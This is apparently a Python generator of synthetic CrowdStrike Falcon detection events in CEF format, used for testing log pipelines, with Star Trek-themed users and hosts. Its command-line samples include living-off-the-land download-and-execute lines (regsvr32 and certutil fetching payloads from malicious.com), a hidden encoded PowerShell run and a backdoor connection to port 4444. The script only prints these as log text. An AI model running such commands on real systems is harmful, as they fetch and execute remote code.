#!/usr/bin/env python3
"""
CrowdStrike Falcon endpoint event generator (CEF format)
"""
from __future__ import annotations
import json
import random
import time
import hashlib
from datetime import datetime, timezone, timedelta
from typing import Dict

# Event types with their details
EVENT_TYPES = [
    {
        "event_simpleName": "ProcessRollup2",
        "name": "Malware Detected",
        "severity": 10,
        "category": "malware"
    },
    {
        "event_simpleName": "SuspiciousActivity",
        "name": "Suspicious Process Activity",
        "severity": 8,
        "category": "suspicious_activity"
    },
    {
        "event_simpleName": "NetworkConnectIP4",
        "name": "Network Connection Blocked",
        "severity": 5,
        "category": "network"
    },
    {
        "event_simpleName": "RegistryOperationDetectInfo",
        "name": "Registry Modification",
        "severity": 5,
        "category": "registry"
    },
    {
        "event_simpleName": "FileWritten",
        "name": "File System Activity",
        "severity": 3,
        "category": "file_system"
    },
    {
        "event_simpleName": "CredentialDumpTool",
        "name": "Credential Theft Attempt",
        "severity": 10,
        "category": "credential_access"
    },
    {
        "event_simpleName": "RansomwareDetected",
        "name": "Ransomware Activity Detected",
        "severity": 10,
        "category": "ransomware"
    },
    {
        "event_simpleName": "PowerShellCommand",
        "name": "PowerShell Script Execution",
        "severity": 8,
        "category": "execution"
    },
    {
        "event_simpleName": "LateralMovement",
        "name": "Lateral Movement Detected",
        "severity": 8,
        "category": "lateral_movement"
    },
    {
        "event_simpleName": "DataExfiltration",
        "name": "Data Exfiltration Attempt",
        "severity": 10,
        "category": "exfiltration"
    },
]

# Sample users and hosts - Starfleet Corp
USERS = ["jean.picard", "jordy.laforge", "haxorsaurus", "worf.security", "data.android", "deanna.troi", "beverly.crusher", "wesley.crusher", "admin", "service_account"]
HOSTNAMES = ["ENTERPRISE-BRIDGE", "ENGINEERING-01", "SECURITY-STATION", "SICKBAY-TERMINAL", "READY-ROOM-PC", "HOLODECK-CONTROL"]
DOMAINS = ["STARFLEET", "ENTERPRISE", "FEDERATION"]

# Threat actors and malware families
THREAT_ACTORS = ["SPIDER", "BEAR", "KITTEN", "PANDA", "JACKAL"]
MALWARE_FAMILIES = ["Emotet", "TrickBot", "Ryuk", "REvil", "CobaltStrike", "Mimikatz", "BloodHound", "SharpHound"]

# Process and file paths
SUSPICIOUS_PROCESSES = [
    "powershell.exe",
    "cmd.exe",
    "rundll32.exe",
    "regsvr32.exe",
    "mshta.exe",
    "wmic.exe",
    "certutil.exe",
    "cscript.exe",
    "wscript.exe"
]

FILE_PATHS = [
    "C:\\Windows\\System32\\",
    "C:\\Windows\\Temp\\",
    "C:\\Users\\Public\\",
    "C:\\ProgramData\\",
    "C:\\Users\\{user}\\AppData\\Local\\Temp\\",
    "C:\\Users\\{user}\\Downloads\\",
    "C:\\Program Files\\",
    "C:\\Windows\\SysWOW64\\"
]

def _generate_hash(hash_type="SHA256"):
    """Generate a random hash"""
    if hash_type == "SHA256":
        return hashlib.sha256(str(random.random()).encode()).hexdigest()
    elif hash_type == "MD5":
        return hashlib.md5(str(random.random()).encode()).hexdigest()
    return hashlib.sha1(str(random.random()).encode()).hexdigest()

def _generate_ip():
    """Generate a random IP address"""
    if random.random() < 0.7:  # 70% internal IPs
        return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    else:  # 30% external IPs
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"

def _timestamp_ms():
    """Generate current timestamp in milliseconds"""
    return int(time.time() * 1000)

def crowdstrike_log(overrides: dict | None = None) -> str:
    """
    Return a single CrowdStrike Falcon event in CEF format.
    
    Pass `overrides` to force any field to a specific value:
        crowdstrike_log({"UserName": "specific_user"})
    """
    event_type = random.choice(EVENT_TYPES)
    user = random.choice(USERS)
    hostname = random.choice(HOSTNAMES)
    domain = random.choice(DOMAINS)
    
    # CEF header fields
    version = "0"
    device_vendor = "CrowdStrike"
    device_product = "Falcon"
    device_version = "6.35.15406.0"
    signature_id = str(random.randint(1000, 9999))
    name = event_type["name"]
    severity = event_type["severity"]
    
    # CEF extension fields (key=value pairs)
    extensions = {}
    
    # Base fields
    extensions.update({
        "rt": int(time.time() * 1000),  # Receipt time
        "start": _timestamp_ms() - random.randint(60000, 3600000),  # Process start time
        "end": 0,  # Process end time
        "dvchost": hostname,
        "duser": user,
        "suid": f"S-1-5-21-{random.randint(100000000, 999999999)}-{random.randint(100000000, 999999999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}",
        "externalId": f"ldt:{_generate_hash('SHA1')[:16]}:{random.randint(100000000000, 999999999999)}",
        "msg": f"Suspicious activity detected: {event_type['name']}",
        "fname": random.choice(SUSPICIOUS_PROCESSES),
        "filePath": random.choice(FILE_PATHS).replace("{user}", user),
        "cs1": _generate_command_line(event_type),
        "cs1Label": "CommandLine",
        "fileHash": _generate_hash("SHA256"),
        "oldFileHash": _generate_hash("SHA1"),
        "fileHashMd5": _generate_hash("MD5"),
        "dntdom": domain,
        "src": f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}",
        "dst": _generate_ip(),
        "dpt": random.choice([80, 443, 445, 3389, 22, 8080, 8443]),
        "proto": random.choice(["TCP", "UDP"]),
        "spt": random.randint(49152, 65535),
        "deviceDirection": random.choice(["0", "1"]),  # 0=inbound, 1=outbound
        "cs2": event_type["event_simpleName"],
        "cs2Label": "EventSimpleName",
        "deviceProcessId": random.randint(1000, 9999),
        "deviceProcessName": random.choice(SUSPICIOUS_PROCESSES),
        "act": "detected"
    })
    
    # Add event-specific fields
    if event_type["category"] == "malware":
        extensions.update({
            "cs3": "Prevention, process killed.",
            "cs3Label": "PatternDisposition",
            "cs4": random.choice(MALWARE_FAMILIES),
            "cs4Label": "ThreatFamily",
            "cs5": f"{random.choice(THREAT_ACTORS)}/{random.choice(MALWARE_FAMILIES)}",
            "cs5Label": "ThreatName",
            "cat": "Malicious File",
            "cs6": "T1204.002",
            "cs6Label": "TechniqueId"
        })
    
    elif event_type["category"] == "credential_access":
        extensions.update({
            "cat": "Credential Dumping",
            "cs3": "T1003",
            "cs3Label": "TechniqueId",
            "cs4": random.choice(["LSASS Memory", "Registry", "NTDS"]),
            "cs4Label": "CredentialAccessType",
            "duser": "Administrator",
            "dntdom": domain
        })
    
    elif event_type["category"] == "network":
        extensions.update({
            "cs3": random.choice(["Outgoing", "Incoming"]),
            "cs3Label": "ConnectionDirection",
            "cs4": random.choice(["Public", "Private"]),
            "cs4Label": "RemoteAddressType",
            "request": f"suspicious-{random.randint(1, 1000)}.{random.choice(['com', 'net', 'org', 'io'])}",
            "app": random.choice(["HTTP", "HTTPS", "DNS", "SMB", "RDP"])
        })
    
    elif event_type["category"] == "ransomware":
        extensions.update({
            "cs3": random.choice(["Ryuk", "REvil", "Conti", "LockBit"]),
            "cs3Label": "RansomwareFamily",
            "cnt": random.randint(10, 1000),
            "cs4": "true",
            "cs4Label": "RansomNoteCreated",
            "cat": "Data Encrypted for Impact",
            "cs5": "T1486",
            "cs5Label": "TechniqueId"
        })
    
    elif event_type["category"] == "lateral_movement":
        extensions.update({
            "shost": hostname,
            "dhost": f"SERVER-{random.randint(1, 50):02d}",
            "cs3": random.choice(["PSExec", "WMI", "RDP", "SMB"]),
            "cs3Label": "LateralMovementTechnique",
            "cs4": f"svc_{random.randint(1000, 9999)}",
            "cs4Label": "ServiceName",
            "cs5": random.choice(["ADMIN$", "C$", "IPC$"]),
            "cs5Label": "ShareName",
            "cat": "Remote Services",
            "cs6": "T1021",
            "cs6Label": "TechniqueId"
        })
    
    # Apply any overrides to extensions
    if overrides:
        # Map common field names to CEF extension fields
        override_mappings = {
            "ThreatFamily": ("cs4", "cs4Label", "ThreatFamily"),
            "ThreatName": ("cs5", "cs5Label", "ThreatName"),
            "Severity": None,  # Severity is handled in CEF header
            "UserName": "duser",
            "HostName": "dvchost",
            "CommandLine": "cs1"
        }
        
        for key, value in overrides.items():
            if key in override_mappings:
                mapping = override_mappings[key]
                if mapping is None:
                    continue  # Skip fields handled elsewhere
                elif isinstance(mapping, tuple):
                    # Handle labeled fields (e.g., cs4 and cs4Label)
                    extensions[mapping[0]] = value
                    extensions[mapping[1]] = mapping[2]
                else:
                    # Direct mapping
                    extensions[mapping] = value
            else:
                # Pass through unmapped overrides
                extensions[key] = value
    
    # Build CEF extension string
    extension_pairs = []
    for key, value in extensions.items():
        # Escape special characters and handle spaces in CEF extensions
        if isinstance(value, str):
            value = value.replace("\\", "\\\\").replace("=", "\\=").replace("|", "\\|")
            # Replace spaces with underscores to avoid breaking key-value parsing
            value = value.replace(" ", "_")
        extension_pairs.append(f"{key}={value}")
    
    extension_str = " ".join(extension_pairs)
    
    # Build full CEF message
    cef_message = f"CEF:{version}|{device_vendor}|{device_product}|{device_version}|{signature_id}|{name}|{severity}|{extension_str}"
    
    return cef_message

def _get_severity_name(severity: int) -> str:
    """Convert numeric severity to name"""
    if severity <= 3:
        return "Low"
    elif severity <= 5:
        return "Medium"
    elif severity <= 8:
        return "High"
    else:
        return "Critical"

def _generate_command_line(event_type: dict) -> str:
    """Generate a realistic command line based on event type"""
    if event_type["category"] == "execution":
        return random.choice([
            "powershell.exe -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -enc aGVsbG8gd29ybGQ=",
            "cmd.exe /c whoami /all && net user",
            "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();",
            "regsvr32.exe /s /n /u /i:http://malicious.com/payload.sct scrobj.dll",
            "wmic.exe process call create \"cmd.exe /c calc.exe\"",
            "certutil.exe -urlcache -split -f http://malicious.com/payload.exe payload.exe"
        ])
    elif event_type["category"] == "malware":
        return random.choice([
            "C:\\Windows\\Temp\\malware.exe -install -silent",
            "C:\\Users\\Public\\backdoor.exe -connect 192.168.1.100:4444",
            "C:\\ProgramData\\update.exe /quiet /norestart"
        ])
    else:
        return f"{random.choice(SUSPICIOUS_PROCESSES)} {random.choice(['/c', '-enc', '/s', '-Command'])} {_generate_hash('MD5')[:8]}"

if __name__ == "__main__":
    # Generate a few sample logs
    for _ in range(3):
        print(crowdstrike_log())
        print()